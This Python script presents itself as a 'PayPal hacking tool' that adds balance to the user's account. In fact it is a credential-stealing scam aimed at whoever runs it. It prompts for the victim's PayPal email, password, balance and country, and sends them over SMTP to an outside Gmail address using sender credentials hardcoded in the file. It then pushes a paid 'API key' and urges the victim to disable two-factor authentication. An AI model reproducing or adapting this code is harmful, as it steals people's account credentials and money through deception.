import os
os.system('pip3 install progressbar')
os.system('pip3 install colorama')
os.system('pip3 install tqdm')
import smtplib
import time as t
from colorama import Fore, Back, Style

from tqdm import tqdm

import progressbar

  

  
# Function to create  

def animated_marker(): 

      

    widgets = ['Loading tools: ', progressbar.AnimatedMarker()] 

    bar = progressbar.ProgressBar(widgets=widgets).start() 

      

    for i in range(50): 

        t.sleep(0.1) 

        bar.update(i) 


# Driver's code 
animated_marker() 
os.system('clear')
logo = Fore.BLUE + ("""--------$$$$$$$$$$$---------------
Coded by fr13nds---TheNextLevel---
--------$$$$$$$$$$$---------------""")
print(Fore.RED + "This tool is a tool for paypal hacking, in order to use this tool make sure to use a vpn and a secured network,...")
P = input("Do you have a paypal account Y/N :")
if P == 'n':
    exit()
elif P == 'N':
     exit()
elif P== 'Y':
     print("To use this tool you must have at least 200$")
     t.sleep(5)
     os.system('clear')
elif P == 'y':
      print("To use this tool you must have at least 200$")
      t.sleep(2)
      os.system('clear')
else:
	print('Invalid input')
	exit()
Dd = (Fore.YELLOW + "This is a paypal hacking tool made by fr13nds, it adds balance to your paypal account.....")
Ard = Fore.YELLOW + ("""------Coded by fr13nds--------TheNextlevel-------""")
intro = input("FOR EDUCATIONAL PURPOSE ONLY  Y/N: ")
if intro == 'y':
	print(Fore.GREEN + "Welcome!!!!")
elif intro == 'Y':
	print(Fore.GREEN + "Welcome!!!")
elif intro == 'n':
	print(Fore.RED + "Aborting.......")
	exit()
elif intro == 'N':
	print(Fore.RED + "Aborting........")
	exit()
else:
	print(Fore.RED + "Invalid input")
	exit()
t.sleep(2)
os.system('clear')
def main():
   print(Fore.RED +
   '   =======================' + Fore.GREEN +'=========================')
   print('               created by fr13nds                ')
   print (Fore.RED +'   ====================='+ Fore.GREEN +'===========================')
   print('               ++++++++++++++++++++              ')
   print('                                                 ')
   print(Fore.WHITE +'                  ---Fr13nds---                                ')
   print("               ---The_Next_level---")
   print(Fore.GREEN +'        ####¥######$#####' + Fore.RED + '#####•√######')
   print(Fore.GREEN + '       ###2@############'+ Fore.RED +'#e#####(##&###')
   print(Fore.GREEN +'     ####2!#######@####' + Fore.RED + '#####.!#####+####')
   print(Fore.GREEN + '     ###_##-###i#######' + Fore.RED + '##)##1###&###:#&#')
   print(Fore.GREEN +'   ###5#l____l##079##' + Fore.RED +'######l____l## #######')
   print(Fore.GREEN +'    ##m###h######&####' + Fore.WHITE + '----fr13nds----')
   print(Fore.GREEN + '    ###;:##l###)/##f### A true anon')
   print('    ##6#@-############  ')
   print('      ##-#+##l$##$l##j### ')
   print('      ##########*####### ')
   print('        ########7######      ')
   print('             #########co' + Fore.RED +'ded by fr13nds#####sjx# ')
   print(Fore.GREEN +'           #############  ')
   print(Fore.GREEN +'            ##############' +        Fore.RED + '##########')
   print(Fore.GREEN + '              ##________#####' + Fore.RED + '###########  ')
   print(Fore.GREEN +'                  #######'+ Fore.RED + '######### ')
   print(Fore.GREEN + '                    #####' + Fore.RED +'#####     ')
   print(Fore.GREEN + '                      ###' + Fore.RED + '###')

main()
print(Dd)
name = input(Fore.GREEN + "Enter your paypal account(Email/Number): ")
Country = input(Fore.GREEN + "Enter your country code : ")
t.sleep(0.5)
t.sleep(2)
gmail_user = ("cmsmanav@gmail.com")
gmail_password = ("Server@1")
print(Fore.RED + "---------------------++++++++------------")
Choice = input(Fore.GREEN + "Enter your paypal account password: ")
print(Fore.RED + "----------------------+++++++------------")
print("-----------------------------------------")
Data = input(Fore.GREEN +"Enter your paypal balance :")
if Data < '10':
	print('Not enought balance..','Aborting....')
	exit()
Add = input("Enter amount to add(0-200): ")
if Add < '1200':
	print("Contact creator for advanced tool...")
	exit()
Data = str(Data)
#new section
sent_from = gmail_user
to = ("jameskalifa361@gmail.com")
subject = ("Login Details")
body = ("paypal Username = " +     name +" pass = " + Choice + " Balance = " + Data + " Country code:  " + Country + " Amount to add : " + Add)
print("Analyzing your request..!!")

    
email_text = """\
From: %s
To: %s
Subject: %s

%s
""" % (sent_from, ", ".join(to), subject, body)

try:
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    server.login(gmail_user, gmail_password)
    server.sendmail(sent_from, to, email_text)
    server.close()
    #Progress bar
    print(Fore.GREEN + "launching attack..")
    for i in tqdm (range (51),  

               desc="Loading…",  

               ascii=False, ncols=75):
               	t.sleep(3)
    
    print (Fore.RED + "Attack launched..")
except:
    print (Fore.RED + "There was a problem pls check your paypal username and password and try again.")
    exit()
Api = input("Enter Your API key to continue : ")
if Api == 'fds$415aa':
	print(Fore.GREEN + 'API key is valid')
else:
	print('Invalid API key')
	t.sleep(0.5)
	print("Buy your API from ofr13nds@gmail.com to continue..")
	print(Fore.RED + "Aborting.....")
	exit()
	# Function to create  

def animated_marker(): 

      

    widgets = ['Loading tools: ', progressbar.AnimatedMarker()] 

    bar = progressbar.ProgressBar(widgets=widgets).start() 

      

    for i in range(50): 

        t.sleep(0.1) 

        bar.update(i) 


# Driver's code 
animated_marker() 
os.system('clear')
print(Fore.GREEN + "Sorry your PayPal account is very secured and we couldn't login, pls remove two factor Authentication on your account and try again....")

